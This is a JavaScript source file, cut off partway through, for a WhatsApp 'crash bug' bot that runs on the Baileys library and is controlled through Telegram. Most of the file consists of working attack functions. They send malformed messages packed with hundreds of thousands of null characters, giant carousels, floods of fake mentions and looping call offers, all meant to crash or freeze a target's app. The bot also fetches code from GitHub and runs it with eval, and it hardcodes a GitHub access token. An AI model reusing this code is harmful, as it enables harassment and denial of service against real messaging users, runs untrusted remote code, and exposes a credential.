const fs = require('fs');
const {
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	generateWAMessage,
	makeInMemoryStore,
	prepareWAMessageMedia,
	generateWAMessageFromContent,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	getContentType,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	proto,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header,
	encodeSignedDeviceIdentity,
	jidEncode,
	jidDecode,
	encodeWAMessage,
	patchMessageBeforeSending,
	encodeNewsletterMessage,
    getUSyncDevices,
	default: makeWaSocket,
	makeWASocket,
	useMultiFileAuthState
} = require("baileys");
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const os = require('os');
const hostname = os.hostname();
const path = require("path");
const moment = require('moment-timezone');
const sessions = new Map();
const sessions_dir = "./sessions";
const file_session = "./active.json";

// --- CONFIG GH LUWH ---
const GITHUB_CONFIG = {
    token: "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", 
    owner: "Luxxy-appocalype",
    repo: "HxZTeams-",       
    path: "cases/", 
    branch: "main"      
};

global.GITHUB_DATABASE = {
    "1": `https://raw.githubusercontent.com/${GITHUB_CONFIG.owner}/${GITHUB_CONFIG.repo}/${GITHUB_CONFIG.branch}/${GITHUB_CONFIG.path}case1.js`,
    "2": `https://raw.githubusercontent.com/${GITHUB_CONFIG.owner}/${GITHUB_CONFIG.repo}/${GITHUB_CONFIG.branch}/${GITHUB_CONFIG.path}case2.js`,
    "3": `https://raw.githubusercontent.com/${GITHUB_CONFIG.owner}/${GITHUB_CONFIG.repo}/${GITHUB_CONFIG.branch}/${GITHUB_CONFIG.path}case3.js`,
    "status": `https://raw.githubusercontent.com/${GITHUB_CONFIG.owner}/${GITHUB_CONFIG.repo}/${GITHUB_CONFIG.branch}/${GITHUB_CONFIG.path}status.json`
};

global.pushToGithub = async function(fileName, content) {
    const url = `https://api.github.com/repos/${GITHUB_CONFIG.owner}/${GITHUB_CONFIG.repo}/contents/${GITHUB_CONFIG.path}${fileName}`;
    try {
        let sha;
        try {
            const res = await axios.get(url, {
                headers: { Authorization: `token ${GITHUB_CONFIG.token}` }
            });
            sha = res.data.sha;
        } catch (e) { sha = null; }

        await axios.put(url, {
            message: `Update ${fileName} via Bot`,
            content: Buffer.from(content).toString('base64'),
            sha: sha,
            branch: GITHUB_CONFIG.branch
        }, {
            headers: { Authorization: `token ${GITHUB_CONFIG.token}` }
        });
        return true;
    } catch (err) {
        console.error("GitHub Push Error:", err.response?.data || err.message);
        return false;
    }
};

global.getRemoteFunction = async function(url) {
    try {
        const axios = require('axios');
        const res = await axios.get(`${url}?t=${Date.now()}`);
        let code = res.data;

        return new Function('client', 'target', 'generateWAMessageFromContent', 'ctx', `
            return (async () => { 
                try {
                    // Masukkan kode mentah dari GitHub
                    ${code} 

                    // MENCARI FUNCTION APAPUN SECARA OTOMATIS
                    // Kita cari nama fungsi yang didefinisikan (misal: async function NAMA...)
                    const functionName = "${code}".match(/async\\s+function\\s+([^\\s(]+)/)?.[1] 
                                      || "${code}".match(/function\\s+([^\\s(]+)/)?.[1];

                    if (functionName && typeof eval(functionName) === 'function') {
                        // Jalankan fungsi yang ditemukan, masukkan client & target
                        await eval(functionName)(client, target);
                    } else {
                        // Jika tidak ada nama fungsi, jalankan sebagai script biasa
                        // (Misal kodenya langsung await client.sendMessage...)
                    }
                } catch (e) {
                    console.error("❌ Execution Error:", e.message);
                }
            })()
        `);
    } catch (err) {
        return null;
    }
};

//=================================================//
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

let client;

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    list.push(BotNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const removeActive = (BotNumber) => {
  if (!fs.existsSync(file_session)) return;
  let list = JSON.parse(fs.readFileSync(file_session));
  list = list.filter(num => num !== BotNumber);
  fs.writeFileSync(file_session, JSON.stringify(list));
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const id = [
"120363397529273307@newsletter",
"120363401349836090@newsletter",
"120363319314627296@newsletter"
];

const followNewsletterV2 = async (conn, ids) => {
  console.log(chalk.blue(`[SYSTEM] Menjalankan Auto-Follow untuk ${ids.length} channel...`));
  for (const newsletterId of ids) {
    try {
      await conn.newsletterFollow(newsletterId);
      console.log(chalk.green(`[V2 SUCCESS] Berhasil mengikuti: ${newsletterId}`));
      await sleep(2500); // Jeda 2.5 detik agar tidak kena spam/ban
    } catch (err) {
      console.error(chalk.yellow(`[V2 ERROR] Gagal follow ${newsletterId}: ${err.message}`));
    }
  }
};

const initializeWhatsAppConnections = async (chatId, ctx) => {
    if (!fs.existsSync(file_session)) return;
    const activeNumbers = JSON.parse(fs.readFileSync(file_session));
    console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

    for (const BotNumber of activeNumbers) {
        // Jika nomor sudah terhubung, jangan buat koneksi baru lagi
        if (sessions.has(BotNumber)) continue; 

        console.log(`Menghubungkan WhatsApp: ${BotNumber}`);
        const sessionDir = sessionPath(BotNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        // Gunakan 'const' atau 'let' agar client tidak tertukar antar nomor dalam loop
        const client = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
            defaultQueryTimeoutMs: undefined,
        });

        client.ev.on("creds.update", saveCreds);

        client.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
            if (connection === "open") {
                console.log(chalk.green(`✅ Bot ${BotNumber} Terhubung!`));
                sessions.set(BotNumber, client);
                
                // Jalankan fungsi newsletter
                try {
                    for (const newsletterId of id) {
                        await client.newsletterFollow(newsletterId);
                    }
                    await followNewsletterV2(client, id);
                } catch (e) {
                    console.log("Newsletter error:", e.message);
                }

                if (ctx) {
                    await ctx.reply(`✅ *WhatsApp Connected Successfully*\n\nNomor: \`${BotNumber}\`\nStatus: Online\nHost: [${hostname}]`, { parse_mode: "Markdown" });
                }
            }

            if (connection === "close") {
                const statusCode = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.error?.output?.payload?.statusCode;
                const reason = lastDisconnect?.error?.message || "No reason found";
                
                const isLoggedOut = statusCode === DisconnectReason.loggedOut;
                // Deteksi Banned
                const isBanned = statusCode === 401 || reason.toLowerCase().includes("forbidden") || reason.toLowerCase().includes("bad-session");

                console.log(chalk.yellow(`⚠️ Koneksi terputus: ${BotNumber} | Code: ${statusCode}`));

                if (isBanned) {
                    console.log(chalk.bold.red(`🚨 NOMOR TERBANED: ${BotNumber}`));
                    sessions.delete(BotNumber);
                    removeActive(BotNumber);
                    if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });

                    if (ctx) {
                        await ctx.reply(`🚨 *AKUN TERBANED (PERMANENT)*\n\n*Nomor:* \`${BotNumber}\`\n*Status:* Blocked by WhatsApp\n*Detail:* Sesi telah dihapus otomatis.`, { parse_mode: "Markdown" });
                    }
                } else if (isLoggedOut) {
                    console.log(chalk.red(`🚫 NOMOR LOGOUT: ${BotNumber}`));
                    sessions.delete(BotNumber);
                    removeActive(BotNumber);
                    if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });

                    if (ctx) {
                        await ctx.reply(`🚫 *SESSION LOGOUT*\n\n*Nomor:* \`${BotNumber}\`\n*Status:* Logout dari perangkat.`, { parse_mode: "Markdown" });
                    }
                } else {
                    // Jika hanya gangguan jaringan atau restart server
                    console.log(chalk.blue(`♻️ Mencoba Reconnect: ${BotNumber}...`));
                    sessions.delete(BotNumber); // Hapus dari map agar bisa reconnect lewat loop
                    
                    setTimeout(() => {
                        initializeWhatsAppConnections(chatId, ctx);
                    }, 5000);
                }
            }
        });
    }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  client = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  client.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, `♻️ WhatsApp Reconnecting in Progress
We're trying to re-establish your WhatsApp session. Please wait a moment...`));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }
      
      sessions.delete(BotNumber);
      removeActive(BotNumber);
      fs.rmSync(sessionDir, { recursive: true, force: true });
      
      await editStatus(makeStatus(BotNumber, `🚫 WhatsApp Session Deleted
Your WhatsApp session has been logged out or blocked and has been deleted. Please connect again your session using /reqpair.`));
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, client);
      saveActive(BotNumber);
      await followNewsletterV2(client, id);
      for (const newsletterId of id) {
          await client.newsletterFollow(newsletterId);
      }

      return await editStatus(makeStatus(BotNumber, `✅ WhatsApp Connected Successfully
Now you can use features that require a WhatsApp session.`));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await client.requestPairingCode(BotNumber, "NVRSX123");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;

          const codeData = makeCode(BotNumber, formatted);
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, codeData.text, {
            parse_mode: "HTML",
            reply_markup: codeData.reply_markup
          });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  client.ev.on("creds.update", saveCreds);
  return client;
};

const makeStatus = (number, status) => `${status}`;

const makeCode = (number, code) => ({
    text: `<b>— 🟢 WhatsApp Pairing Session</b>

<b>▢ Number :</b> ${number}
<b>▢ Pairing Code :</b> <code>${code}</code>

‼️ Silakan masukkan kode ini di aplikasi WhatsApp Anda untuk menyelesaikan proses penautan perangkat.
<blockquote><b>— ▢ Tata Cara Menautkan Perangkat (Kode Pairing)</b>
1. Buka aplikasi WhatsApp di ponsel Anda.
2. Masuk ke menu:
   • Android: ketuk ikon ⋮ → Perangkat Tertaut
   • iPhone: Settings → Linked Devices
3. Ketuk "Tautkan Perangkat".
4. Pilih "Masukkan Kode" (Enter Code).
5. Masukkan kode pairing: <code>${code}</code>.
6. Tunggu proses verifikasi selesai.
7. Perangkat berhasil ditautkan dan siap digunakan.</blockquote>`
});
//=================================================//

//=================================================//
async function galaxy(isTarget) {
  await client.relayMessage("status@broadcast", {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: { 
            text: "🩸⃟⃨〫⃰‣ ⁖𝐓𝐳𝐗 ͢𖣂︎͢ 𝐓›𝐞𝐚͢𝐦",
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(522500)}\",\"flow_message_version\":\"3\"}`,
            version: 3
          },
          contextInfo: {
            remoteJid: "status@broadcast",
            participant: "0@s.whatsapp.net",
            fromMe: true,
            isForwarded: true,
            forwardingScore: 999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "༑ Fail Beta - ( rizxvelzx3sh ) \"👋\"",
              newsletterJid: "120363319314627296@newsletter",
              serverMessageId: 1
            },
            quotedMessage: {
              interactiveResponseMessage: {
                body: {
                  text: "©️ running since 2020 to 20##?",
                  format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                  name: 'address_message',
                  paramsJson: "\u0000".repeat(522500),
                  version: 3
                }
              }
            }
          }
        }
      }
    }
  }, {
    statusJidList: [isTarget],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: isTarget }, content: [] }]
      }]
    }]
  });

  console.log(chalk.green("─────「 ⏤ Galaxy-Super Ex3cute 」─────"));
}

//=================================================//
async function crashGP(isTarget) {
await client.relayMessage(isTarget, {
  "interactiveMessage": {
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "review_and_pay",
          "buttonParamsJson": `{\"currency\":\"IDR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":800,\"offset\":100},\"reference_id\":\"4TU82OG2957\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-2c7378a6-1643-4dba-8b2d-23e556a81ad4\",\"name\":\"${'\u0000'.repeat(50000)}\",\"amount\":{\"value\":800,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"xtx\",\"native_payment_methods\":[],\"share_payment_status\":false}`
          }
        ]
      }
    }
  }, {});
}

async function payNulL(isTarget, ptcp = true) {
  const message = {
    requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      requestFrom: isTarget, 
      expiryTimestamp: null,
      amount: {
        value: 9999999999, 
        offset: 9999999999, 
        currencyCode: 'IDR'
      },
      contextInfo: {
        forwardingScore: 9999,
        isForwarded: true,
        fromMe: false,
        remoteJid: "status@broadcast",
        externalAdReply: {
          title: "꙳͙͡༑ᐧ̤𝐓͜𝐑𝐀͓᪳𝐒⃪𝐇 🍷 𝐍͢𝐕͢𝐑͢𝐒͢𝐗͢   ⃜꙳͙͡༑ᐧ", 
          body: "༑ Fail Beta - ( ExL¡ps0r ) \"👋\"", 
          mimetype: 'image',
          caption: "𐎟 ͢ 𝐍͢𝐕͢𝐑͢𝐒͢𝐗͢ 𝚰𝐍͢𝐅͢𝚰𝐍͢𝚰𝐓͢𝐘͢ ͢",
          showAdAttribution: true,
          sourceUrl: 'https://t.me/Aurelxa',
          thumbnailUrl: { url: "https://files.catbox.moe/jf66gl.jpg" }
        }
      }
    }
  };

  await client.relayMessage(isTarget, message, 
    ptcp ? { participant: { jid: isTarget } } : {});
}

async function oneMsg(isTarget) {
  await client.relayMessage(isTarget, {
    requestPaymentMessage: {
      currencyCodeIso4217: 'USD',
      requestFrom: isTarget,
      expiryTimestamp: null,
      contextInfo: {
        remoteJid: " X ",
        isForwarded: true,
        forwardingScore: 979,
        externalAdReply: {
          title: "@ Sólo un trabas",
          body: "@ Sólo un trabas",
          mediaType: "VIDEO",
          renderLargerThumbnail: true,
          previewTtpe: "VIDEO",
          sourceUrl: "https://t.me/Aurelxa",
          mediaUrl: "https://t.me/Aurelxa",
          showAdAttribution: true,
        }
      }
    }
  }, {
    participant: { jid: isTarget },
    quoted: null,
    useraJid: null,
    messageId: null
  });
}

async function InVisibleAndroid(isTarget, show = true) {
    let push = [];

    for (let r = 0; r < 1055; r++) {
        push.push({
            body: proto.Message.InteractiveMessage.Body.fromObject({ text: " \u0000 " }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " \u0003 " }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: " ",
                hasMediaAttachment: true,
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
                    fileLength: "18352",
                    height: 720,
                    width: 1280,
                    mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
                    fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
                    directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1737281900",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIiQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
                    scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
                    scanLengths: [3537, 10557, 1905, 2353],
                    midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo="
                }
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: []
            })
        });
    }

    let msg = await generateWAMessageFromContent(
        isTarget,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ text: "🩸⃟༑⌁⃰𝐍͢𝐕͢𝐑͢𝐒͢𝐗͢ ᐧ̤𝐓͜𝐑𝐀͓᪳𝐒⃪𝐇🦠" }),
                        header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                            cards: [...push]
                        })
                    })
                }
            }
        },
        {}
    );

        await client.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [isTarget],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }]
                        }
                    ]
                }
            ]
        });

        if (show) {
            await client.relayMessage(isTarget, {
                groupStatusMentionMessage: {
                    message: { protocolMessage: { key: msg.key, type: 25 } }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "ExL¡ps0r.🕸️" }
                    }
                ]
            }
        );

        console.log(chalk.green(
            `Succes Send Bug By NvrsX Valcoon.🐉
Number: ${isTarget}`
        ));
        await new Promise(resolve => setTimeout(resolve, 9000));
    }
}

async function LotDelay(isTarget) {
  try {
    const PouMsg = generateWAMessageFromContent(isTarget, {
      lottieStickerMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/575792415_1326859005559789_4936376743727174453_n.enc?ccb=11-4&oh=01_Q5Aa2wHHWbG7rC7tgA06Nu-D-aE4S0YhhV3ZUBkuvXsJvhm2-A&oe=692E7E33&_nc_sid=5e03e0&mms3=true",
            fileSha256: "Q285fqG3P7QFkMIuD2xPU5BjH3NqCZgk/vtnmVkvZfk=",
            fileEncSha256: "ad10CF3pqlFDELFQFiluzUiSKdh0rzb3Zi6gc4GBAzk=",
            mediaKey: "ZdPiFwyd2GUfnDxjSgIeDiaS7SXwMx4i2wdobVLK6MU=",
            mimetype: "application/was",
            height: 512,
            width: 512,
            directPath: "/v/t62.15575-24/575792415_1326859005559789_4936376743727174453_n.enc?ccb=11-4&oh=01_Q5Aa2wHHWbG7rC7tgA06Nu-D-aE4S0YhhV3ZUBkuvXsJvhm2-A&oe=692E7E33&_nc_sid=5e03e0",
            fileLength: "25155",
            mediaKeyTimestamp: "1762062705",
            isAnimated: true,
            stickerSentTs: "1762062705158",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              remoteJid: "status@broadcast"
            }
          }
        }
      }
    }, { userJid: isTarget })

    await client.relayMessage(
      isTarget,
      PouMsg.message,
      { messageId: PouMsg.key.id }
    )

    console.log("TRAVAS BY NVRSX")
  } catch (err) {
    console.error("ERROR COK:", err)
  }
}

async function VisiFriend(isTarget) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");
    const crypto = require("crypto");
    let devices = (
        await client.getUSyncDevices([isTarget], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await client.assertSessions(devices);

    let node1 = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let node2 = node1();
    let node3 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let node4 = client.createParticipantNodes.bind(client);
    let node5 = client.encodeWAMessage?.bind(client);

    client.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (client.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = client.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: isTargetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = isTargetUser === ownPnUser || isTargetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                let bytes = node3(
                    node5 ? node5(msg) : encodeWAMessage(msg)
                );

                return node2.mutex(jid, async () => {
                    let { type, ciphertext } = await client.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };
    const startTime = Date.now();
    const duration = 10 * 60 * 1000;
    while (Date.now() - startTime < duration) {
        for (let i = 0; i < 10; i++) {
            let awik = crypto.randomBytes(32);
            let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

            let {
                nodes: destinations,
                shouldIncludeDeviceIdentity
            } = await client.createParticipantNodes(
                devices,
                { conversation: "y" },
                { count: "0" }
            );

            let lemiting = {
                tag: "call",
                attrs: {
                    to: isTarget,
                    id: client.generateMessageTag(),
                    from: client.user.id
                },
                content: [{
                    tag: "offer",
                    attrs: {
                        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                        "call-creator": client.user.id
                    },
                    content: [
                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },

                        {
                            tag: "video",
                            attrs: {
                                orientation: "0",
                                screen_width: "1920",
                                screen_height: "1080",
                                device_orientation: "0",
                                enc: "vp8",
                                dec: "vp8"
                            }
                        },

                        { tag: "net", attrs: { medium: "3" } },

                        {
                            tag: "capability",
                            attrs: { ver: "1" },
                            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
                        },

                        { tag: "encopt", attrs: { keygen: "2" } },

                        { tag: "destination", attrs: {}, content: destinations },

                        ...(shouldIncludeDeviceIdentity ? [{
                            tag: "device-identity",
                            attrs: {},
                            content: encodeSignedDeviceIdentity(client.authState.creds.account, true)
                        }] : [])
                    ]
                }]
            };

            await client.sendNode(lemiting);
            await new Promise(resolve => setTimeout(resolve, 500)); 
        }

        try {
            await client.chatModify({ clear: true }, isTarget);
            console.log("KONEKSI");
        } catch (error) {
            console.error("GAGAL:", error);
        }
        await new Promise(resolve => setTimeout(resolve, 2000));
    }
    console.log(chalk.red("Succesfully Attack Target By : @Aurelxa"));  
}

async function TrashLocIOS(isTarget) {
    const slash = { url: "https://b.top4top.io/p_3627yrgsq1.jpg" };
    let locationMessage = {
        degreesLatitude: -9.09999262999,
        degreesLongitude: 199.99963118999,
        jpegThumbnail: slash,
        name: "🩸⃟⃨〫⃰‣ ⁖ᐧ̤𝐓͜𝐑𝐀͓᪳𝐒⃪𝐇 🍷 𝐍͢𝐕͢𝐑͢𝐒͢𝐗͢ ‣—" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
        address: "©️ NvrsxTeams" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
        url: `https://rizxvelz-ex3sh.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com` + ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿"
    };
    
    let msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: {
                locationMessage
            }
        }
    }, {});
    
    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }]
            }]
        }]
    });
    console.log(chalk.green("Success Send Bug By NvrsX Valcoon 🐉"));
}

async function location(isTarget) {
 for (let i = 0; i < 100; i++) {
  const LocaX = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0.000000,
          degreesLongitude: 0.000000,
          name: "ꦽ".repeat(150),
          address: "ꦽ".repeat(100),
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: isTarget,
            remoteJid: isTarget,
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }};

  const msg = generateWAMessageFromContent("status@broadcast", LocaX, {});

  await client.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: isTarget },
          content: undefined
        }]
      }]
    }]
  }, {
    participant: isTarget
  });
 }
}

async function sjlglx(isTarget) {
  await client.relayMessage("status@broadcast", {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { 
            text: "# ᐧ̤𝐓͜𝐑𝐀͓᪳𝐒⃪𝐇 🍷 𝐍͢𝐕͢𝐑͢𝐒͢𝐗͢ ",
            format: "DEFAULT" 
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: `{ "${'\u0000'.repeat(1045000)}" }`,
              version: 3
            }
          }
        }
      }
    },
    {
      statusJidList: [isTarget],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: isTarget }, content: [] }]
            }
          ]
        }
      ]
    }
  );

  console.log(chalk.green("─────「 ⏤ Aurelxa  - ExL¡ps0r」─────"));
}

async function gsgalaxy(isTarget) {
    const msg = await generateWAMessageFromContent(isTarget,{
        interactiveResponseMessage: {
          contextInfo: {},
          body: {
            text: " # ! NvrsX - ExL¡ps0r ! ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
